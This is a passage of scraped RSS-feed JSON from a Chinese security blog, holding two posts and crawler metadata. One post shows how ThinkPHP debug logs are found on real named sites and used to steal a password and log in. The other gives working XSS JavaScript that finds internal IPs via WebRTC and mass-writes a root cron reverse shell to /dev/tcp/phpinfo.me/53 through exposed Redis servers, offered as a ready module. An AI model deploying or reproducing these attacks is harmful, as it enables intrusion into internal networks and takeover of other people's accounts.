19:04:35","title":"ThinkPHP使用不当可能造成敏感信息泄露","link":"https://phpinfo.me/index.php/archives/1351/","description":"\n<p>&#160;</p><p>ThinkPHP在开启DEBUG的情况下会在Runtime目录下生成日志，而且debug很多站都没关的，所以影响应该很大吧</p><p>我们来看一下ThinkPHP3.2版本生成日志结构：</p><p><a href=\"https://phpinfo.me/usr/uploads/2016/09/123.jpg\"><img class=\"alignnone size-full wp-image-1352\" src=\"https://phpinfo.me/usr/uploads/2016/09/123.jpg\" alt=\"123\" width=\"938\" height=\"356\"></a></p><p>THINKPHP3.2 结构：Application\\Runtime\\Logs\\Home\\16_09_09.log</p><p>THINKPHP3.1结构：Runtime\\Logs\\Home\\16_09_09.log</p><p>可以看到是 ：项目名\\Runtime\\Logs\\Home\\年份_月份_日期.log</p><p>这样的话日志很容易被猜解到，而且日志里面有执行SQL语句的记录，这里我随便找几个tp站测试一下：</p><p>http://demo.xxxxx.cc/Runtime/Logs/User/16_09_06.log 成功下载，并且找到一个用户的密码</p><p>&#160;</p><p><a href=\"https://phpinfo.me/usr/uploads/2016/09/log.jpg\"><img class=\"alignnone size-full wp-image-1353\" src=\"https://phpinfo.me/usr/uploads/2016/09/log.jpg\" alt=\"log\" width=\"1061\" height=\"676\"></a></p><p>成功登录：</p><p><a href=\"https://phpinfo.me/usr/uploads/2016/09/233333.jpg\"><img class=\"alignnone size-full wp-image-1354\" src=\"https://phpinfo.me/usr/uploads/2016/09/233333.jpg\" alt=\"233333\" width=\"1146\" height=\"424\"></a></p><p>我们再找一个案例:http://www.xxxxxx.com/Runtime/Logs/Home/16_09_06.log</p><p>&#160;</p><p><a href=\"https://phpinfo.me/usr/uploads/2016/09/1234.jpg\"><img class=\"alignnone size-full wp-image-1355\" src=\"https://phpinfo.me/usr/uploads/2016/09/1234.jpg\" alt=\"1234\" width=\"1234\" height=\"681\"></a></p><p>成功登录：</p><p><a href=\"https://phpinfo.me/usr/uploads/2016/09/31.jpg\"><img class=\"alignnone wp-image-1358 size-full\" src=\"https://phpinfo.me/usr/uploads/2016/09/31.jpg\" width=\"963\" height=\"495\"></a></p><p>onethink官网测试</p><p>http://www.onethink.cn/Runtime/Logs/16_09_07.log</p><p>&#160;</p><p>修复办法：</p><p>删除Runtime/Logs下的所有文件，并将APP_DEBUG设置为false</p>\n","descriptionType":"html","publishedDate":"Thu, 08 Sep 2016 22:45:36 +0000","feedId":9920,"bgimg":"https://phpinfo.me/usr/uploads/2016/09/123.jpg","linkMd5":"d75fc9e54ecc533e589aaa2d1a4ba195","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn63@2020_5/2020/08/25/11-04-37-331_15234cd6993b9372.webp","destWidth":938,"destHeight":356,"sourceBytes":27724,"destBytes":19160,"author":"admin","articleImgCdnMap":{"https://phpinfo.me/usr/uploads/2016/09/123.jpg":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn63@2020_5/2020/08/25/11-04-37-331_15234cd6993b9372.webp","https://phpinfo.me/usr/uploads/2016/09/log.jpg":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn99@2020_4/2020/08/25/11-04-46-479_a117be818727c411.webp","https://phpinfo.me/usr/uploads/2016/09/233333.jpg":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn87@2020_6/2020/08/25/11-04-42-293_6014f4aaac52896c.webp","https://phpinfo.me/usr/uploads/2016/09/1234.jpg":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn91@2020_5/2020/08/25/11-04-46-236_5eb524d16b49ae43.webp","https://phpinfo.me/usr/uploads/2016/09/31.jpg":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn4@2020_3/2020/08/25/11-04-45-640_36da2f5ec40f0e1a.webp"},"publishedOrCreatedDate":1598353475042},{"createdTime":"2020-08-25 19:04:35","updatedTime":"2020-08-25 19:04:35","title":"xss自动化内网渗透","link":"https://phpinfo.me/index.php/archives/1285/","description":"\n<p>利用xss或者社工让对方点我的链接，然后利用js自动化攻击内网redis,</p><p>利用redis写任务计划批量反弹shell。</p><p>js扫内网6379不太好实现，就不进行端口探测了，直接对整个网段执行一遍exp</p><p>利用如下代码获取内网ip段：</p><pre class=\"brush: html; gutter: false\">&#60;!DOCTYPE html&#62;\n&#60;html lang=&#34;en&#34;&#62;\n&#60;head&#62;\n    &#60;meta charset=&#34;UTF-8&#34; /&#62;\n    &#60;title&#62;Document&#60;/title&#62;\n&#60;/head&#62;\n&#60;body&#62;\n    \n&#60;/body&#62;\n&#60;script&#62;\n    ipList = []\n    var webrtcxss = {\n    webrtc        : function(callback){\n        var ip_dups           = {};\n        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;\n        var mediaConstraints  = {\n            optional: [{RtpDataChannels: true}]\n        };\n        var servers = undefined;\n        if(window.webkitRTCPeerConnection){\n            servers = {iceServers: []};\n        }\n        var pc = new RTCPeerConnection(servers, mediaConstraints);\n        pc.onicecandidate = function(ice){\n            if(ice.candidate){\n                var ip_regex        = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/;\n                var ip_addr         = ip_regex.exec(ice.candidate.candidate)[1]; \n                if(ip_dups[ip_addr] === undefined)\n                callback(ip_addr);\n                ip_dups[ip_addr]    = true;\n            }\n        };\n        pc.createDataChannel(&#34;&#34;);\n        pc.createOffer(function(result){\n            pc.setLocalDescription(result, function(){});\n        });\n    },\n    getIp        : function(){\n        this.webrtc(function(ip){\n            ipList.push(ip);\n        });\n    }\n}\nwebrtcxss.getIp()\nsetTimeout(function() {\n    alert(ipList)\n}, 300)\n&#60;/script&#62;\n&#60;/html&#62;</pre><p>&#160;</p><p>效果如下图</p><p><a href=\"https://phpinfo.me/usr/uploads/2016/07/1231.jpg\"><img class=\"alignnone wp-image-1293 size-full\" src=\"https://phpinfo.me/usr/uploads/2016/07/1231.jpg\" alt=\"\" width=\"1049\" height=\"538\"></a></p><p>&#160;</p><p>利用ajax攻击redis原理：</p><p>参考文章：http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/</p><p>https://www.t00ls.net/thread-34873-1-1.html</p><p>http://www.freebuf.com/articles/web/19622.html</p><p>&#160;</p><p>下面是一个ajax操作redis写任务计划反弹的例子：</p><pre class=\"brush: javascript; gutter: false\">var ip = &#039;192.168.203.2&#039;;\nvar port= &#039;6379&#039;;\nvar dir = &#039;/var/spool/cron/&#039;;\nvar filename = &#039;root&#039;;\nvar content = &#039;*/1 * * * * /bin/bash -i &#62;&#38; /dev/tcp/phpinfo.me/53 0&#62;&#38;1&#039;;\nvar url = &#34;http://&#34; + ip + &#34;:&#34; + port;\n\nvar cmd = new XMLHttpRequest();\ncmd.open(&#34;POST&#34;,  url);\ncmd.send(&#039;eval \\&#039;&#039; + &#039;redis.call(\\&#34;set\\&#34;, \\&#34;hacked\\&#34;, &#34;\\\\r\\\\n\\\\n&#039;+content+&#039;\\\\n\\\\n\\\\n\\\\n\\&#34;); redis.call(\\&#34;config\\&#34;, \\&#34;set\\&#34;, \\&#34;dir\\&#34;, \\&#34;&#039; + dir + &#039;/\\&#34;); redis.call(\\&#34;config\\&#34;, \\&#34;set\\&#34;, \\&#34;dbfilename\\&#34;, \\&#34;&#039;+filename+&#039;\\&#34;); &#039; + &#039;\\&#039; 0&#039; + &#34;\\r\\n&#34;);\n \nvar cmd = new XMLHttpRequest();\ncmd.open(&#34;POST&#34;,  url);\ncmd.send(&#039;save\\r\\n&#039;);</pre><p>&#160;</p><p>最后来实现自动获取内网ip，自动批量攻击内网1-255的ip</p><pre class=\"brush: javascript; gutter: false\">&#60;!DOCTYPE html&#62;\n&#60;html lang=&#34;en&#34;&#62;\n&#60;head&#62;\n    &#60;meta charset=&#34;UTF-8&#34; /&#62;\n    &#60;title&#62;Document&#60;/title&#62;\n&#60;/head&#62;\n&#60;body&#62;\n    \n&#60;/body&#62;\n&#60;script&#62;\n    ipList = []\n    var webrtcxss = {\n    webrtc        : function(callback){\n        var ip_dups           = {};\n        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;\n        var mediaConstraints  = {\n            optional: [{RtpDataChannels: true}]\n        };\n        var servers = undefined;\n        if(window.webkitRTCPeerConnection){\n            servers = {iceServers: []};\n        }\n        var pc = new RTCPeerConnection(servers, mediaConstraints);\n        pc.onicecandidate = function(ice){\n            if(ice.candidate){\n                var ip_regex        = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/;\n                var ip_addr         = ip_regex.exec(ice.candidate.candidate)[1]; \n                if(ip_dups[ip_addr] === undefined)\n                callback(ip_addr);\n                ip_dups[ip_addr]    = true;\n            }\n        };\n        pc.createDataChannel(&#34;&#34;);\n        pc.createOffer(function(result){\n            pc.setLocalDescription(result, function(){});\n        });\n    },\n    getIp        : function(){\n        this.webrtc(function(ip){\n            ipList.push(ip);\n        });\n    }\n}\nwebrtcxss.getIp()\nsetTimeout(function() {\n    for(var i in ipList) {\n        if(ipList[i]) {\n            var iparr = ipList[i].split(&#34;.&#34;);\n            for(var i=0;i&#60;255;i++) {\n                var attkip = iparr [0] + &#34;.&#34; + iparr [1] + &#34;.&#34; + iparr [2] + &#34;.&#34; + i;\n                send(attkip);\n            }\n        }\n    }\n}, 300);\n\nfunction send(ip) {\n    var port= &#039;6379&#039;;\n    var dir = &#039;/var/spool/cron/&#039;;\n    var filename = &#039;root&#039;;\n    var content = &#039;*/1 * * * * /bin/bash -i &#62;&#38; /dev/tcp/phpinfo.me/53 0&#62;&#38;1&#039;;\n    var url = &#34;http://&#34; + ip + &#34;:&#34; + port;\n\n    var cmd = new XMLHttpRequest();\n    cmd.open(&#34;POST&#34;,  url);\n    cmd.send(&#039;eval \\&#039;&#039; + &#039;redis.call(\\&#34;set\\&#34;, \\&#34;hacked\\&#34;, &#34;\\\\r\\\\n\\\\n&#039;+content+&#039;\\\\n\\\\n\\\\n\\\\n\\&#34;); redis.call(\\&#34;config\\&#34;, \\&#34;set\\&#34;, \\&#34;dir\\&#34;, \\&#34;&#039; + dir + &#039;/\\&#34;); redis.call(\\&#34;config\\&#34;, \\&#34;set\\&#34;, \\&#34;dbfilename\\&#34;, \\&#34;&#039;+filename+&#039;\\&#34;); &#039; + &#039;\\&#039; 0&#039; + &#34;\\r\\n&#34;);\n     \n    var cmd = new XMLHttpRequest();\n    cmd.open(&#34;POST&#34;,  url);\n    cmd.send(&#039;save\\r\\n&#039;);\n    \n}\n\n&#60;/script&#62;\n&#60;/html&#62;</pre><p>如果嫌1-255不够可以再加一个for循环</p><p><a href=\"https://phpinfo.me/usr/uploads/2016/07/hack11.jpg\"><img class=\"alignnone wp-image-1296 size-full\" src=\"https://phpinfo.me/usr/uploads/2016/07/hack11.jpg\" alt=\"\" width=\"1213\" height=\"566\"></a></p><p>&#160;</p><p>自动向内网redis发送攻击代码</p><p>然后在自己的服务器中用nc监听你设置的端口，然后你会发现服务器已经躺在这了</p><p><a href=\"https://phpinfo.me/usr/uploads/2016/07/ok.jpg\"><img class=\"alignnone size-full wp-image-1288\" src=\"https://phpinfo.me/usr/uploads/2016/07/ok.jpg\" alt=\"ok\" width=\"1010\" height=\"589\"></a></p><p>&#160;</p><p>&#160;</p><p>测试模块已加入xss平台:http://xss.phpinfo.me/</p>\n","descriptionType":"html","publishedDate":"Thu, 28 Jul 2016 07:34:51 +0000","feedId":9920,"bgimg":"https://phpinfo.me/usr/uploads/2016/07/1231.jpg","linkMd5":"a5762995d6a82ebd79bfddcf982c4d2a","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn55@2020_4/2020/08/25/11-04-38-266_881972454ae0872f.webp","destWidth":1049,"destHeight":538,"sourceBytes":133902,"destBytes":16446,"author":"admin","articleImgCdnMap":{"https://phpinfo.me/usr/uploads/2016/07/1231.jpg":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn55@2020_4/2020/08/25/11-04-38-266_881972454ae0872f.webp","https://phpinfo.me/usr/uploads/2016/07/hack11.jpg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn96@2020_5/2020/08/25/11-04-51-727_a5024af0a5b6dcca.webp","https://phpinfo.me/usr/uploads/2016/07/ok.jpg":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn6@2020_6/2020/08/25/11-04-53-558_dae626fcdecf8a24.webp"},"publishedOrCreatedDate":1598353475043}],"record":{"createdTime":"2020-08-25 19:04:35","updatedTime":"2020-08-25 19:04:35","feedId":9920,"fetchDate":"Tue, 25 Aug 2020 11:04:35 +0000","fetchMs":1701,"handleMs":3864,"totalMs":25408,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"5c3c7994bde81976c76d401e970f7417","hostName":"us-032*","requestId":"01e3d2e0a5b94d428c37fbce59e35118_9920","contentType":"application/rss+xml; charset=UTF-8","totalBytes":673212,"bgimgsTotal":6,"bgimgsGithubTotal":6,"articlesImgsTotal":14,"articlesImgsGithubTotal":14,"successGithubMap":{"myreaderx8":1,"myreaderx25":1,"myreaderx16":1,"myreaderx6":1,"myreaderx32":1,"myreaderx33":1,"myreaderx23":1,"myreaderx12":1,"myreaderx24":1,"myreaderx13":1,"myreaderx31":1,"myreaderx5oss":1,"myreaderx18":1,"myreaderx19":1},"failGithubMap":{}},"feed":{"createdTime":"2020-08-25 04:35:30","updatedTime":"2020-08-25 04:35:30","id":9920,"name":"Lcy’s Blog ","url":"https://phpinfo.me/feed","subscriber":null,"website":null,"icon":"https://phpinfo.me/favicon.ico","icon_jsdelivr":null,"description":"Just So So ...","weekly":null,"link":"https://phpinfo.me"},"noPictureArticleList":[],"tmpCommonImgCdnBytes":173746,"tmpBodyImgCdnBytes":499466,"tmpBgImgCdnBytes":0,"extra4":{"start":1598353469477,"total":0,"statList":[{"spend":1702,"msg":"获取xml内容"},{"spend":3864,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":14730,"msg":"正文链接上传到cdn"}]},"extra5":14,"extra6":14,"extra7ImgCdnFailResultVector":[],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-037.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe21.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe62.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe63.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-59.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-008.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-024.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-012.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2015/08/py-300x242.png","sourceStatusCode":200,"destWidth":300,"destHeight":242,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn67@2020_1/2020/08/25/11-04-36-780_b4e724604285033c.webp","sourceBytes":18500,"destBytes":4590,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":2475,"convertSpendMs":6,"createdTime":"2020-08-25 19:04:35","host":"us-55*","referer":"https://phpinfo.me/index.php/archives/1026/","linkMd5ListStr":"f4710662db36962f369bf8790902c3c7,f4710662db36962f369bf8790902c3c7","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"18.1 KB","destSize":"4.5 KB","compressRate":"24.8%"},{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2016/06/1.png","sourceStatusCode":200,"destWidth":434,"destHeight":142,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn76@2020_6/2020/08/25/11-04-36-762_f5fc81956faa5c03.webp","sourceBytes":3919,"destBytes":7780,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":2541,"convertSpendMs":8,"createdTime":"2020-08-25 19:04:35","host":"us-020*","referer":"https://phpinfo.me/index.php/archives/1255/","linkMd5ListStr":"4d074c6d5e5ab3aa16b9a28878d5557c,4d074c6d5e5ab3aa16b9a28878d5557c","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.8 KB","destSize":"7.6 KB","compressRate":"198.5%"},{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2016/08/1234.png","sourceStatusCode":200,"destWidth":1311,"destHeight":704,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn60@2020_6/2020/08/25/11-04-36-994_0741929ea2fddb5a.webp","sourceBytes":92445,"destBytes":72972,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":2882,"convertSpendMs":57,"createdTime":"2020-08-25 19:04:35","host":"us-004*","referer":"https://phpinfo.me/index.php/archives/1334/","linkMd5ListStr":"aba559451acfa0952fc576c0f0e7c3b4,aba559451acfa0952fc576c0f0e7c3b4","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"90.3 KB","destSize":"71.3 KB","compressRate":"78.9%"},{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2016/09/123.jpg","sourceStatusCode":200,"destWidth":938,"destHeight":356,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn63@2020_5/2020/08/25/11-04-37-331_15234cd6993b9372.webp","sourceBytes":27724,"destBytes":19160,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":3184,"convertSpendMs":15,"createdTime":"2020-08-25 19:04:35","host":"europe67*","referer":"https://phpinfo.me/index.php/archives/1351/","linkMd5ListStr":"d75fc9e54ecc533e589aaa2d1a4ba195,d75fc9e54ecc533e589aaa2d1a4ba195","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"27.1 KB","destSize":"18.7 KB","compressRate":"69.1%"},{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2016/07/1231.jpg","sourceStatusCode":200,"destWidth":1049,"destHeight":538,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn55@2020_4/2020/08/25/11-04-38-266_881972454ae0872f.webp","sourceBytes":133902,"destBytes":16446,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":4086,"convertSpendMs":23,"createdTime":"2020-08-25 19:04:35","host":"us-016*","referer":"https://phpinfo.me/index.php/archives/1285/","linkMd5ListStr":"a5762995d6a82ebd79bfddcf982c4d2a,a5762995d6a82ebd79bfddcf982c4d2a","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"130.8 KB","destSize":"16.1 KB","compressRate":"12.3%"},{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2016/08/123-1.png","sourceStatusCode":200,"destWidth":951,"destHeight":562,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn71@2020_4/2020/08/25/11-04-39-239_80e40a057a4e5f46.webp","sourceBytes":65516,"destBytes":52798,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":3091,"convertSpendMs":34,"createdTime":"2020-08-25 19:04:37","host":"us-033*","referer":"https://phpinfo.me/index.php/archives/1329/","linkMd5ListStr":"8eb781d9248969b325cab76ed11cb4f3,8eb781d9248969b325cab76ed11cb4f3","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"64 KB","destSize":"51.6 KB","compressRate":"80.6%"},{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2016/06/2.png","sourceStatusCode":200,"destWidth":586,"destHeight":264,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn83@2020_1/2020/08/25/11-04-41-789_f0cc7cf91402decb.webp","sourceBytes":6391,"destBytes":17334,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":2440,"convertSpendMs":9,"createdTime":"2020-08-25 19:04:40","host":"europe21*","referer":"https://phpinfo.me/index.php/archives/1255/","linkMd5ListStr":"4d074c6d5e5ab3aa16b9a28878d5557c","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"6.2 KB","destSize":"16.9 KB","compressRate":"271.2%"},{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2016/07/redis.png","sourceStatusCode":200,"destWidth":247,"destHeight":220,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn80@2020_2/2020/08/25/11-04-42-555_991304b201edf20e.webp","sourceBytes":52904,"destBytes":7900,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":3181,"convertSpendMs":12,"createdTime":"2020-08-25 19:04:40","host":"us-008*","referer":"https://phpinfo.me/index.php/archives/1275/","linkMd5ListStr":"5a7a82ce5ed5956ed159148eacbbe9bc","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"51.7 KB","destSize":"7.7 KB","compressRate":"14.9%"},{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2016/09/233333.jpg","sourceStatusCode":200,"destWidth":1146,"destHeight":424,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn87@2020_6/2020/08/25/11-04-42-293_6014f4aaac52896c.webp","sourceBytes":46965,"destBytes":33472,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":3084,"convertSpendMs":21,"createdTime":"2020-08-25 19:04:40","host":"europe-59*","referer":"https://phpinfo.me/index.php/archives/1351/","linkMd5ListStr":"d75fc9e54ecc533e589aaa2d1a4ba195","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"45.9 KB","destSize":"32.7 KB","compressRate":"71.3%"},{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2016/09/31.jpg","sourceStatusCode":200,"destWidth":963,"destHeight":495,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn4@2020_3/2020/08/25/11-04-45-640_36da2f5ec40f0e1a.webp","sourceBytes":42267,"destBytes":28490,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":6401,"convertSpendMs":24,"createdTime":"2020-08-25 19:04:40","host":"europe62*","referer":"https://phpinfo.me/index.php/archives/1351/","linkMd5ListStr":"d75fc9e54ecc533e589aaa2d1a4ba195","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"41.3 KB","destSize":"27.8 KB","compressRate":"67.4%"},{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2016/09/1234.jpg","sourceStatusCode":200,"destWidth":1234,"destHeight":681,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn91@2020_5/2020/08/25/11-04-46-236_5eb524d16b49ae43.webp","sourceBytes":143637,"destBytes":111696,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":7037,"convertSpendMs":57,"createdTime":"2020-08-25 19:04:40","host":"us-037*","referer":"https://phpinfo.me/index.php/archives/1351/","linkMd5ListStr":"d75fc9e54ecc533e589aaa2d1a4ba195","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"140.3 KB","destSize":"109.1 KB","compressRate":"77.8%"},{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2016/09/log.jpg","sourceStatusCode":200,"destWidth":1061,"destHeight":676,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn99@2020_4/2020/08/25/11-04-46-479_a117be818727c411.webp","sourceBytes":173128,"destBytes":140344,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":7320,"convertSpendMs":43,"createdTime":"2020-08-25 19:04:40","host":"us-012*","referer":"https://phpinfo.me/index.php/archives/1351/","linkMd5ListStr":"d75fc9e54ecc533e589aaa2d1a4ba195","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"169.1 KB","destSize":"137.1 KB","compressRate":"81.1%"},{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2016/07/hack11.jpg","sourceStatusCode":200,"destWidth":1213,"destHeight":566,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn96@2020_5/2020/08/25/11-04-51-727_a5024af0a5b6dcca.webp","sourceBytes":587598,"destBytes":72002,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":12538,"convertSpendMs":35,"createdTime":"2020-08-25 19:04:40","host":"us-024*","referer":"https://phpinfo.me/index.php/archives/1285/","linkMd5ListStr":"a5762995d6a82ebd79bfddcf982c4d2a","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"573.8 KB","destSize":"70.3 KB","compressRate":"12.3%"},{"code":1,"isDone":false,"source":"https://phpinfo.me/usr/uploads/2016/07/ok.jpg","sourceStatusCode":200,"destWidth":1010,"destHeight":589,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn6@2020_6/2020/08/25/11-04-53-558_dae626fcdecf8a24.webp","sourceBytes":458253,"destBytes":88228,"targetWebpQuality":75,"feedId":9920,"totalSpendMs":14578,"convertSpendMs":43,"createdTime":"2020-08-25 19:04:40","host":"europe63*","referer":"https://phpinfo.me/index.php/archives/1285/","linkMd5ListStr":"a5762995d6a82ebd79bfddcf982c4d2a","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"447.5 KB","destSize":"86.2 KB","compressRate":"19.3%"}],"successGithubMap":{"myreaderx8":1,"myreaderx25":1,"myreaderx16":1,"myreaderx6":1,"myreaderx32":1,"myreaderx33":1,"myreaderx23":1,"myreaderx12":1,"myreaderx24":1,"myreaderx13":1,"myreaderx31":1,"myreaderx5oss":1,"myreaderx18":1,"myreaderx19":1},"failGithubMap":{}}